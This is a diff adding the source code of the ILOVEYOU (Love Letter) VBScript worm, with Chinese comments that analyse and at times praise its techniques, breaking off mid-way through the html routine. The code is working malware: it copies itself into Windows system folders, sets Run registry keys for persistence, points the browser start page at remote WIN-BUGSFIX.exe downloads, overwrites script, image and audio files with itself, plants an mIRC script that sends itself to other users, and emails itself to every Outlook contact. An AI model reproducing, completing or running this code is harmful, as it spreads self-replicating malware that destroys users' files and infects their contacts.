@@ -1,0 +1,278 @@
+rem barok -loveletter(vbe)
+rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philip
+pines
+" 注释：程序作者的签名（可能）
+
+On Error Resume Next
+dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
+eq=""
+ctr=0
+Set fso = CreateObject("Scripting.FileSystemObject")
+" 注释：FileSystemObject是M$ VBVM系统中最危险的部分，它的功能十分强大
+
+" 从病毒使用FSO可以知道，通过修改注册表，可以轻易防止 Love Letter发作。
+
+
+set file = fso.OpenTextFile(WScript.ScriptFullname,1)
+vbscopy=file.ReadAll
+main()
+" 注释 - 程序初始化完成。
+
+sub main()
+On Error Resume Next
+dim wscr,rr
+set wscr=CreateObject("WScript.Shell")
+rr=wscr.RegRead("HKEY_CURRENT_USER/Software/Microsoft/Windows Scriptin
+g Host/Settings/Timeout")
+if (rr>=1) then
+wscr.RegWrite "HKEY_CURRENT_USER/Software/Microsoft/Windows Scripting
+Host/Settings/Timeout",0,"REG_DWORD"
+" 注释 - 防止操作超时造成的程序终止。
+" 应该说，编写病毒的程序员考虑到了可能发生的问题，这一点值得所有的编程
+者借鉴。
+end if
+Set dirwin = fso.GetSpecialFolder(0)
+Set dirsystem = fso.GetSpecialFolder(1)
+Set dirtemp = fso.GetSpecialFolder(2)
+" 获取系统关键文件夹的名称
+" VB编程时可以用。
+
+Set c = fso.GetFile(WScript.ScriptFullName)
+c.Copy(dirsystem&"/MSKernel32.vbs")
+c.Copy(dirwin&"/Win32DLL.vbs")
+c.Copy(dirsystem&"/LOVE-LETTER-FOR-YOU.TXT.vbs")
+" 复制自身到关键目录中备用。
+" 文件名并不是很好。太容易被发现了。
+
+regruns()
+html()
+spreadtoemail()
+listadriv()
+end sub
+sub regruns()
+" 修改注册表，以便自动装载病毒程序
+" 预防：经常检查注册表中的这一分支。
+" 已知的方法还有把HTA放入Startup文件夹。病毒程序使用的方法更先进，
+" 因为它不会因为语言问题而失效。
+On Error Resume Next
+Dim num,downread
+regcreate "HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersio
+n/Run/MSKernel32",dirsystem&"/MSKernel32.vbs"
+regcreate "HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersio
+n/RunServices/Win32DLL",dirwin&"/Win32DLL.vbs"
+downread=""
+downread=regget("HKEY_CURRENT_USER/Software/Microsoft/Internet Explore
+r/Download Directory")
+if (downread="") then
+downread="c:/"
+end if
+if (fileexist(dirsystem&"/WinFAT32.exe")=1) then
+Randomize
+num = Int((4 * Rnd) + 1)
+if num = 1 then
+regcreate "HKCU/Software/Microsoft/Internet Explorer/Main/Start Page",
+"http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnj
+w6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
+elseif num = 2 then
+regcreate "HKCU/Software/Microsoft/Internet Explorer/Main/Start Page",
+"http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe
+546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
+elseif num = 3 then
+regcreate "HKCU/Software/Microsoft/Internet Explorer/Main/Start Page",
+"http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnm
+POhfgER67b3Vbvg/WIN-BUGSFIX.exe"
+elseif num = 4 then
+regcreate "HKCU/Software/Microsoft/Internet Explorer/Main/Start Page",
+"http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkh
+YUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-B
+UGSFIX.exe"
+end if
+end if
+if (fileexist(downread&"/WIN-BUGSFIX.exe")=0) then
+regcreate "HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersio
+n/Run/WIN-BUGSFIX",downread&"/WIN-BUGSFIX.exe"
+regcreate "HKEY_CURRENT_USER/Software/Microsoft/Internet Explorer/Main
+/Start Page","about:blank"
+end if
+end sub
+sub listadriv
+" 遍历所有驱动器。
+On Error Resume Next
+Dim d,dc,s
+Set dc = fso.Drives
+For Each d in dc
+If d.DriveType = 2 or d.DriveType=3 Then
+folderlist(d.path&"/")
+end if
+Next
+listadriv = s
+end sub
+sub infectfiles(folderspec)
+" 执行传染文件的操作。
+On Error Resume Next
+dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
+set f = fso.GetFolder(folderspec)
+set fc = f.Files
+for each f1 in fc
+ext=fso.GetExtensionName(f1.path)
+ext=lcase(ext)
+s=lcase(f1.name)
+if (ext="vbs") or (ext="vbe") then
+set ap=fso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext=
+"sct") or (ext="hta") then
+set ap=fso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+bname=fso.GetBaseName(f1.path)
+set cop=fso.GetFile(f1.path)
+cop.copy(folderspec&"/"&bname&".vbs")
+fso.DeleteFile(f1.path)
+elseif(ext="jpg") or (ext="jpeg") then
+set ap=fso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+set cop=fso.GetFile(f1.path)
+cop.copy(f1.path&".vbs")
+fso.DeleteFile(f1.path)
+elseif(ext="mp3") or (ext="mp2") then
+set mp3=fso.CreateTextFile(f1.path&".vbs")
+mp3.write vbscopy
+mp3.close
+set att=fso.GetFile(f1.path)
+att.attributes=att.attributes+2
+end if
+if (eq<>folderspec) then
+if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="scri
+pt.ini") or (s="mirc.hlp") then
+set scriptini=fso.CreateTextFile(folderspec&"/script.ini")
+scriptini.WriteLine "[script]"
+scriptini.WriteLine ";mIRC Script"
+scriptini.WriteLine "; Please dont edit this script... mIRC will corru
+pt, if mIRC will"
+scriptini.WriteLine " corrupt... WINDOWS will affect and will not run
+correctly. thanks"
+" 病毒作者的英文恐怕没学好……不过，这样吓唬人也够损的了。
+" 这里提醒各位注意，不要在乎那些吓人的文字，仔细观察就会发现漏洞其实不
+少。
+scriptini.WriteLine ";"
+scriptini.WriteLine ";Khaled Mardam-Bey"
+scriptini.WriteLine ";http://www.mirc.com"
+scriptini.WriteLine ";"
+scriptini.WriteLine "n0=on 1:JOIN:#:{"
+scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
+scriptini.WriteLine "n2= /.dcc send $nick "&dirsystem&"/LOVE-LETTER-FO
+R-YOU.HTM"
+scriptini.WriteLine "n3=}"
+" 注意，这样做的结果是，MIRC也能够传染病毒。
+scriptini.close
+eq=folderspec
+end if
+end if
+next
+end sub
+sub folderlist(folderspec)
+" 遍历文件夹
+On Error Resume Next
+dim f,f1,sf
+set f = fso.GetFolder(folderspec)
+set sf = f.SubFolders
+for each f1 in sf
+infectfiles(f1.path)
+folderlist(f1.path)
+next
+end sub
+sub regcreate(regkey,regvalue)
+" 修改注册表（创建键值）
+" 这个程序似乎是微软的示范程序。
+Set regedit = CreateObject("WScript.Shell")
+regedit.RegWrite regkey,regvalue
+end sub
+function regget(value)
+" 这个程序似乎也是微软的示范程序。(WSH示范，在Windows文件夹)
+Set regedit = CreateObject("WScript.Shell")
+regget=regedit.RegRead(value)
+end function
+function fileexist(filespec)
+" 判断文件是否存在
+" 纯粹从技术角度讲，这段程序写的不怎么样。
+" 不用写这么长就能够实现相同的功能
+On Error Resume Next
+dim msg
+if (fso.FileExists(filespec)) Then
+msg = 0
+else
+msg = 1
+end if
+fileexist = msg
+end function
+function folderexist(folderspec)
+" 判断文件夹是否存在
+" 和上一段程序一样臭。
+On Error Resume Next
+dim msg
+if (fso.GetFolderExists(folderspec)) then
+msg = 0
+else
+msg = 1
+end if
+fileexist = msg
+end function
+sub spreadtoemail()
+" 通过电子邮件扩散
+On Error Resume Next
+dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
+set regedit=CreateObject("WScript.Shell")
+set out=WScript.CreateObject("Outlook.Application")
+" 病毒的局限：只支持Outlook，而Outlook Express则不支持。
+set mapi=out.GetNameSpace("MAPI")
+for ctrlists=1 to mapi.AddressLists.Count
+set a=mapi.AddressLists(ctrlists)
+x=1
+regv=regedit.RegRead("HKEY_CURRENT_USER/Software/Microsoft/WAB/"&a)
+if (regv="") then
+regv=1
+end if
+if (int(a.AddressEntries.Count)>int(regv)) then
+for ctrentries=1 to a.AddressEntries.Count
+malead=a.AddressEntries(x)
+regad=""
+regad=regedit.RegRead("HKEY_CURRENT_USER/Software/Microsoft/WAB/"&male
+ad)
+if (regad="") then
+set male=out.CreateItem(0)
+male.Recipients.Add(malead)
+male.Subject = "ILOVEYOU"
+" 病毒得名的原因
+" 见到这样的邮件，肯定是病毒。
+" 头脑正常的人恐怕不会这样直白的。
+male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from m
+e."
+male.Attachments.Add(dirsystem&"/LOVE-LETTER-FOR-YOU.TXT.vbs")
+male.Send
+regedit.RegWrite "HKEY_CURRENT_USER/Software/Microsoft/WAB/"&malead,1,
+"REG_DWORD"
+end if
+x=x+1
+next
+regedit.RegWrite "HKEY_CURRENT_USER/Software/Microsoft/WAB/"&a,a.Addre
+ssEntries.Count
+else
+regedit.RegWrite "HKEY_CURRENT_USER/Software/Microsoft/WAB/"&a,a.Addre
+ssEntries.Count
+end if
+next
+Set out=Nothing
+Set mapi=Nothing
+end sub
+sub html
+" 从技术角度说，这段程序写得很漂亮，原因在于充分地利用了 Outlook 的资源
+。
+" 值得编写程序的借鉴。
+" 程序中间的_符号是连接线，所以注释写在这里。
+" 程序中无效语句很多，浪费了不少空间。
+On Error Resume Next
+dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
+dta1="
